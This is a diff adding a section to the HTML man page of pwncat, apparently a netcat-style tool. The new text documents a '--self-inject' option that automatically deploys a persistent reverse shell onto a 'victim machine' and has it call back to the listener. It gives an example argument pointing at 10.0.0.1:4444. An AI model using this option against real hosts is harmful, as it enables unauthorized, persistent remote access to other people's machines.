@@ -179,6 +179,23 @@ piped into a file, color will automatically be disabled.
 This mode also disables color on Windows by default.
 (default: auto)</p>
 
+<p style="margin-left:11%; margin-top: 1em"><b>command
+&amp; control arguments: <br>
+&minus;&minus;self&minus;inject</b> cmd:host:port</p>
+
+<p style="margin-left:22%;">Listen mode (TCP only): If you
+are about to inject a reverse shell onto the victim machine
+(via php, bash, nc, ncat or similar), start your listening
+server with this argument. This will then (as soon as the
+reverse shell connects) automatically deploy and
+background&minus;run an unbreakable pwncat reverse shell
+onto the victim machine which then also connects back to you
+with specified arguments. Example:
+&rsquo;&minus;&minus;self&minus;inject
+/bin/bash:10.0.0.1:4444&rsquo; Note: this is currently an
+experimental feature and does not work on Windows remote
+hosts yet.</p>
+
 <p style="margin-left:11%; margin-top: 1em"><b>advanced
 arguments: <br>
 &minus;&minus;script&minus;send</b> file</p>
